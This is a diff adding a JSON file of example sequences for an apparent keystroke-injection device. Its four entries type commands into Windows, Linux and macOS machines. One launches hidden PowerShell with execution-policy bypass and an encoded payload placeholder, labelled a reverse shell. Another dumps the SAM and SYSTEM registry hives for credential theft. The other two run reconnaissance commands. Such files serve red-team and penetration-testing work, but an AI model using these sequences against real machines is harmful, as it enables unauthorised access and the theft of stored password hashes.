@@ -1,0 +1,52 @@
+{
+  "version": "1.0",
+  "name": "example-sequences",
+  "sequences": [
+    {
+      "name": "Windows Run Reverse Shell",
+      "device_profile": "generic_keyboard",
+      "blocks": [
+        { "id": "seq1b01", "type": "key_combo", "enabled": true, "params": { "modifiers": ["GUI"], "key": "r" } },
+        { "id": "seq1b02", "type": "delay", "enabled": true, "params": { "ms": 500 } },
+        { "id": "seq1b03", "type": "type_text", "enabled": true, "params": { "text": "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc BASE64PAYLOAD", "delay_ms": 20 } },
+        { "id": "seq1b04", "type": "press_key", "enabled": true, "params": { "key": "ENTER" } }
+      ]
+    },
+    {
+      "name": "Linux Terminal Open",
+      "device_profile": "generic_keyboard",
+      "blocks": [
+        { "id": "seq2b01", "type": "key_combo", "enabled": true, "params": { "modifiers": ["CTRL", "ALT"], "key": "t" } },
+        { "id": "seq2b02", "type": "delay", "enabled": true, "params": { "ms": 1000 } },
+        { "id": "seq2b03", "type": "type_text", "enabled": true, "params": { "text": "id && uname -a && hostname", "delay_ms": 25 } },
+        { "id": "seq2b04", "type": "press_key", "enabled": true, "params": { "key": "ENTER" } }
+      ]
+    },
+    {
+      "name": "Windows Credential Dump",
+      "device_profile": "generic_keyboard",
+      "blocks": [
+        { "id": "seq3b01", "type": "key_combo", "enabled": true, "params": { "modifiers": ["GUI"], "key": "r" } },
+        { "id": "seq3b02", "type": "delay", "enabled": true, "params": { "ms": 600 } },
+        { "id": "seq3b03", "type": "type_text", "enabled": true, "params": { "text": "cmd /c start /min powershell", "delay_ms": 20 } },
+        { "id": "seq3b04", "type": "press_key", "enabled": true, "params": { "key": "ENTER" } },
+        { "id": "seq3b05", "type": "delay", "enabled": true, "params": { "ms": 1500 } },
+        { "id": "seq3b06", "type": "type_text", "enabled": true, "params": { "text": "reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM sys.save", "delay_ms": 20 } },
+        { "id": "seq3b07", "type": "press_key", "enabled": true, "params": { "key": "ENTER" } }
+      ]
+    },
+    {
+      "name": "macOS Terminal Open",
+      "device_profile": "apple_keyboard",
+      "blocks": [
+        { "id": "seq4b01", "type": "key_combo", "enabled": true, "params": { "modifiers": ["GUI"], "key": "SPACE" } },
+        { "id": "seq4b02", "type": "delay", "enabled": true, "params": { "ms": 500 } },
+        { "id": "seq4b03", "type": "type_text", "enabled": true, "params": { "text": "Terminal", "delay_ms": 50 } },
+        { "id": "seq4b04", "type": "press_key", "enabled": true, "params": { "key": "ENTER" } },
+        { "id": "seq4b05", "type": "delay", "enabled": true, "params": { "ms": 800 } },
+        { "id": "seq4b06", "type": "type_text", "enabled": true, "params": { "text": "id && sw_vers", "delay_ms": 25 } },
+        { "id": "seq4b07", "type": "press_key", "enabled": true, "params": { "key": "ENTER" } }
+      ]
+    }
+  ]
+}
